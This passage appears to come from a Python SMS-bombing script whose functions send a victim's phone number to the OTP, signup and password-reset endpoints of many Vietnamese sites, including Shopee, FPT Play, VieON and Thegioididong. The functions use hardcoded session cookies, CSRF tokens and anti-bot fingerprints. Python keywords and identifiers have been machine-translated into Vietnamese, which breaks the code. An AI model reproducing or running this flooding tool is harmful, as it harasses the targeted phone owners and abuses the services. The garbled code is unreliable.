        'x-đã làm': 'A0EB7FD5EA287DBF',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    phản hồi = yêu cầu.đăng(
        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    


def send_otp_via_VIEON(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://vieon.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    tham số = {
        'nền tảng': 'web',
        'giao diện người dùng': '012021',
    }

    dữ liệu json = {
        'tên người dùng': sdt,
        'country_code': 'VN',
        'mô hình': 'Windows 10',
        'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
        'device_name': 'Edge/127',
        'device_type': 'máy tính để bàn',
        'nền tảng': 'web',
        'giao diện người dùng': '012021',
    }

    phản hồi = yêu cầu.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
    

def send_otp_via_ghn(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://sso.ghn.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'loại': 'đăng ký',
    }

    phản hồi = yêu cầu.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    


def send_otp_via_lottemart(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        # 'cookie': '__Host-next-auth.csrf-token=14b2514d94fe41605786ef086cffbab297d54c010cdb62c54bc8dad4c84f17ce%7Cf56d91c5542867ff5e83a10d7b0c0b481903f9dfa0917700d5b96641511dd8d8; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'dnt': '1',
        'nguồn gốc': 'https://www.lottemart.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'tên người dùng': sdt,
        'trường hợp': 'đăng ký',
    }

    phản hồi = yêu cầu.đăng(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp',
        headers=tiêu đề,
        json=dữ liệu json,
    )
    





def send_otp_via_DONGCRE(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'chấp nhận-ngôn ngữ': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'nguồn gốc': 'https://vayvnd.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'đăng nhập': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    phản hồi = yêu cầu.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
    






def send_otp_via_shopee(sdt):
    bánh quy = {
        '_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
        'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
        'SPC_F': 'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
        'REC_T_ID': '23f51dde-355f-11ef-bcef-3eebbabc6162',
        'SPC_R_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_R_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        'SPC_T_ID': 'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        'SPC_T_IV': 'OGxlR1dmMTU0SlI0cWJPZA==',
        '__LOCALE__null': 'VN',
        'csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'SPC_SI': 'p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=',
        'SPC_SEC_SI': 'v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=',
        '_sapid': '1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'af-ac-enc-dat': '438deef2a644b9a6',
        'af-ac-enc-sz-token': '',
        'kiểu-nội-dung': 'ứng-dụng/json',
        # 'cookie': '_QPWSDCXHZQA=e7d49dd0-6ed7-4de5-a3d4-a5dddf426740; REC7iLP4Q=312bf815-7526-4121-82bf-61c29691b57f; SPC_F=eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq; REC_T_ID=23f51dde-355f-11ef-bcef-3eebbabc6162; SPC_R_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_R_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; SPC_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; __LOCALE__null=VN; csrftoken=PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs; SPC_SI=p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=; SPC_SEC_SI=v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=; _sapid=1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
        'dnt': '1',
        'nguồn gốc': 'https://shopee.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-source': 'pc',
        'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'x-requested-with': 'XMLHttpRequest',
        'x-sap-ri': '22d9a8667b497dfe94c089340401498ec675997cbc5522816f11',
        'x-sap-sec': 'u476ZVItP6d5d4mjdbAXdgcjKHFhdxPj2bFOdZcj/6FRdZtjMbFndaJjNbFXdbcjQ6FYdbZjdbTKdgmj1HTVdihjXbTXdjLjDbTzdjUjGbAsdlmjYbA/dm3jZbA2dmmjabAVdyJjjbAXdzcjlbAzdzFjhHDpdCGjobD/dG3jE bDQdGZjHVDNdYLjObDDdYZjkbDbdwejIVDzdwUjLbAXdbFjdbA4pbTIj2Vwd6Fj0btjdycgdbAexbTfQbtjdbFjdYuMg3R2dbAfu+JgdbFjdbFicmAmm6FOr4gV0FVMdbTFRTFgdbFjGVM7BbUjdmmjdbFjdbJOjbFjdbFjdgp5 d6FjdwnL2dnfehPjdbsORbUjdbFjdffRd6FjdbFjgFDdVQSzd6Fjnb8jdwFgdbFud6FjsbUjdzNzZqlVd6Fjvb8jdlFidbA2d6FjP1U0zzmgdbFuUwR1dbFjUEMSOBFjdZ04ObUjdaSwN7JjdbFlmb8jdfFidbFjdbTccbUjdbF jdbiAdVFjdbFj06mjdbTd7kdDOV8jdzb1b1qqfGpdmLdIqAAKbRL2SgDbBNg6B3nVd7kGR7z4+wJ7/SSwEScz+iqxyMwILgB12leqy9yJfu70zqiQnIK2ygQtEcp6oSZ42fKlHdCQVg5R19dNKIZ6UIIK0AzVwJsXTLbqq3J/i8 rgxRmTn+rOOQG40bhL70hPMPRhbJAC+M0yWItYBwrvGjS4PdAPtn5ioTpEKu4zqw6ogq5Dc+AJpdsvRWZB71oRp6qeur1aMxYkXHiYukh88xRrpj+t5K+OndYJeXfMScjRaYcUbZItYcOAvG3gacwmnxPK9FVwLgq+pD0M3UxDW WEF3VrG1lEjFX8fe8CLeRmb9f7OmN78WcxxPrkRQp6oDTgiEgC8cLXyfNziJj26Ehw72GpZfVQTL83eiqN9PyHYVVdgBXRDzUlt2ZrTkam6CP9G0lNtX3EIzhx0zPNMjqianyiQlzOVpAePiwIH/6FjdbmjdbF4RkZoRbFjdGMm X/PwdbFjShlMH/8O2LUjdbFjQbFjdCetJ6y/XoLodbFjdbFjdbFldbFj4qNrSSX+3bFbdbFj6HTr22kcoV8pR8LkdbFjdbUjdbDaEVFjd6FjdwDhdbFzdbFjs0N2S6FjdbFzdbFjMRwF6HmjdbAwW0FyRbFjdfdtkbgwdbFj92x Ll1DrRHgwdbFj2EfR0xPP0EJjdbFjQbFjdaZ586CeX0LoRbFjdzqIPjMgdbFjzOGjdbUjdbAjuHFjRbFjdzqIPjMwdbFj2vF4HLfdStgjdbFjQbFjdz9mxU80RDtYRbFjdfJ2+QgfdbFj/t8XdbJjdbFI2hl+KvZ426FjdbD=',
        'x-shopee-ngôn ngữ': 'vi',
        'x-sz-sdk-version': '1.10.12',
    }

    dữ liệu json = {
        'hoạt động': 8,
        'điện thoại được mã hóa': '',
        'điện thoại': sdt,
        'kênh được hỗ trợ': [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        'support_session': Đúng,
    }

    phản hồi = yêu cầu.post('https://shopee.vn/api/v4/otp/get_settings_v2', cookie=cookies, headers=headers, json=json_data)


    



def send_otp_via_TGDD(sdt):
    bánh quy = {
        'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue, navigator.vendor%3DGoogle%20Inc., navigator.appName%3DNetscape, navigator.plugins.length%3D%3D0%3Dfalse, navigator.platform%3DWin32, navigator.webdriver%3Dfalse, plugin_ext%3Dno%20extention, ActiveXObject%3Dfalse, webkitURL%3Dtrue,_phantom%3Dfalse, callPhantom%3Dfalse, chrome%3Dtrue, yandex%3Dfalse, opera%3Dfalse, opr%3Dfalse, safari%3Dfalse, awesomium%3Dfalse, puffinDevice%3Dfalse, __nightmare%3Dfalse, domAutomation%3Dfalse, domAutomationCon troller%3Dsai,_Selenium_IDE_Recorder%3Dsai,document.__webdriver_script_fn%3Dsai,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dsai,process.version%3Dsai,navigator.cpuClass%3Dsai,navigator.oscpu%3Dsai,navigator.connection%3Dđúng,navigator.language%3D%3D'C'%3Dsai,window.outerWidth%3D%3D0%3Dsai,window.outerHeight%3D%3D0%3Dsai,window.WebGLRenderingContext%3Dđúng,document.documentMode%3Dchưa xác định,eval.toString().length%3D33,digest=",
        'SvID': 'beline173|ZqjdK|ZqjdJ',
        'DMX_Personal': '%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Địa chỉ%22%3Anull%2C%22Culture%22%3A%22vi-3%22 %2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22 %3Anull%2C%22CRMTùy chỉnh merId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22Custom erIdentity%22%3Anull%2C%22Ngày sinh của khách hàng%22%3Anull%2C%22Địa chỉ khách hàng%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTw MxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY',
    }

    tiêu đề = {
        'Chấp nhận': '*/*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomatio nController%3Dsai,_Selenium_IDE_Recorder%3Dsai,document.__webdriver_script_fn%3Dsai,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dsai,process.version%3Dsai,navigator.cpuClass%3Dsai,navigator.oscpu%3Dsai,navigator.connection%3Dđúng,navigator.language%3D%3D'C'%3Dsai,window.outerWidth%3D%3D0%3Dsai,window.outerHeight%3D%3D0%3Dsai,window.WebGLRenderingContext%3Dđúng,document.documentMode%3Dchưa xác định,eval.toString().length%3D33,digest=; SvID=beline173|ZqjdK|ZqjdJ; DMX_Personal=%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Địa chỉ%22%3Anull%2C%22Culture%22%3A% 22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2 C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22Mã phiếu giảm giá%22%3Anull%2C%22CR MCustomerId%22%3Hủy%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Hủy%2C%22CustomerPhone%22%3Hủy%2C%22CustomerEmail%22%3Hủy%2C%22CustomerIdentity%22%3Hủy%2C%22CustomerBirthday%22%3Hủy%2C%22CustomerAddress%22%3Hủy%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Z c4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY",
        'DNT': '1',
        'Nguồn gốc': 'https://www.thegioididong.com',
        'Người giới thiệu': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'số điện thoại': sdt,
        'isReSend': 'sai',
        'gửiOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
    }

    phản hồi = yêu cầu.đăng(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookie=cookie,
        headers=tiêu đề,
        dữ liệu=dữ liệu,
    )

    



def send_otp_via_fptshop(sdt):
    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'kênh đặt hàng': '1',
        'nguồn gốc': 'https://fptshop.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
    



def send_otp_via_WinMart(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang không xác định',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://winmart.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://winmart.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    dữ liệu json = {
        'firstName': 'Nguyễn Quang Ngọc',
        'số điện thoại': sdt,
        'masanReferralCode': '',
        'ngày sinh': '2024-07-26',
        'giới tính': 'Nam',
    }

    phản hồi = yêu cầu.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
    

def send_otp_via_vietloan(sdt):
    bánh quy = {
        '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
        'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2x ScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmN zMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWt zcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0Z jYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0d UNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_cache_client': 'sai',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_png_client': 'sai',
        'ec_png_client_utm': 'không',
        'ec_etag_client': 'sai',
        'ec_etag_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_etag_client_utm': 'null',
        'uid': '65518847-15fb-c698-6901-aae49c28ed93',
        'khách hàng': 'sai',
        'client_utm': 'null',
    }

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991; XSRF-TOKEN=eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQi tnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1Yz ZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUm t6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2 Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk 0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D; ec_cache_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_png_client=sai; ec_png_client_utm=null; ec_etag_client=sai; ec_etag_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_etag_client_utm=null; uid=65518847-15fb-c698-6901-aae49c28ed93; máy khách=sai; máy khách_utm=null',
        'dnt': '1',
        'nguồn gốc': 'https://vietloan.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
        'điện thoại': sdt,
        '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
    }

    phản hồi = yêu cầu.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

    


def send_otp_via_lozi(sdt):
    tiêu đề = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://lozi.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://lozi.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
